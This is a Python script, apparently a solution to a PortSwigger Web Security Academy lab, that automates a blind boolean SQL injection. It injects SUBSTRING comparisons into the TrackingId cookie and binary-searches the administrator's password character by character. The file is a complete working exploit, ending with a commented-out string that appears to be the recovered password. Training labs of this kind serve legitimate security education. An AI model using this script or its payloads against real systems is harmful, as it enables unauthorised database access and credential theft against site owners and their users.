import requests
import string
import itertools
import random



def request_with_injection(inject):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://portswigger.net/',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
    }

    cookies = {
        'TrackingId': 'Uc2c2moxFBBg4vkW' + inject,
        'session': 'Yr3gzuyo4CnMtEcHGugtP5S7Lyzc6YD4'
    }

    response = requests.get('https://ac431f791e17cef880343892000b00c4.web-security-academy.net/', headers=headers, cookies=cookies)
    return response.text


def successful(response_text):
    success = 'Welcome back!'
    if 'Server Error' in response_text:
        print(response_text)
        exit(1)
    return success in response_text


def injection(inject):
    return successful(request_with_injection(inject))


def get_length():
    for i in itertools.count():
        inject = f"' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i + 1}, {i + 1}) >= '{string.printable[0]}"
        if not successful(request_with_injection(inject)):
            return i - 1


def get_i(i):
    consider = string.digits + string.ascii_uppercase + string.ascii_lowercase

    start = 0
    end = len(consider) -1 
    print(consider[start:end])
    while True:
        mid = (start + end) // 2
        inject = f"'AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, {1}) > '{consider[mid]}"
        guess = f"'AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, {1})='{consider[mid]}"
        print(guess)
        if injection(guess):
            return consider[mid]
        success = injection(inject)
        print(success)
        if success:
            start = mid + 1
        else:
            end = mid - 1
        print(consider[start:end])

def get_all(): 
    res = ''
    for i in range(1, get_length() + 1):
        ci = get_i(i)
        print(ci)
        res += ci
    return res


# print(get_length)
print(get_all())
# pyhsyeot2ou2m2qunvk4
